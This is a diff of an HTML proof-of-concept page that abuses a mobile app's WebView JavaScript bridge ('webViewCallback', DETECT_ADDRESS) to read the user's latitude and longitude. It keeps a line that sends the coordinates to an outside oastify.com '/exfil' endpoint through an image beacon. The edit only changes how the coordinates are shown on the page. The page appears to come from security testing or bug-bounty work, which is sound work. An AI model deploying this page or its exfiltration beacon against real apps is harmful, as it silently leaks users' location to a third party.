@@ -1,14 +1,13 @@
-<!-- mex-location-hook.html -->
+<!-- mex-get-location.html -->
 <!DOCTYPE html>
 <html>
-
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>webViewCallback::DETECT_ADDRESS - JavaScript Bridge Call</title>
 </head>
-
 <body>
+    <pre id="output">Waiting for location...</pre>
     <script src="https://cdn.jsdelivr.net/npm/eruda"></script>
     <script>
         eruda.init();
@@ -21,7 +20,10 @@
             var long = d.data.location.longitude;
             new Image().src = 'https://4w1k2viyg5bt9kta3rwnj4twbnhe54tt.oastify.com/exfil?lat=' +
   encodeURIComponent(lat) + '&long=' + encodeURIComponent(long);
-            document.write('<pre><b>Location:</b> https://maps.google.com/?q=' + lat + ',' + long + '</pre>');
+            document.getElementById('output').textContent =
+              'Lat  : ' + lat + '\n' +
+              'Long : ' + long + '\n' +
+              'Map  : https://maps.google.com/?q=' + lat + ',' + long;
           }
         };
         window.webViewCallback.postMessage(JSON.stringify({
@@ -30,5 +32,4 @@
         }));
     </script>
 </body>
-
 </html>
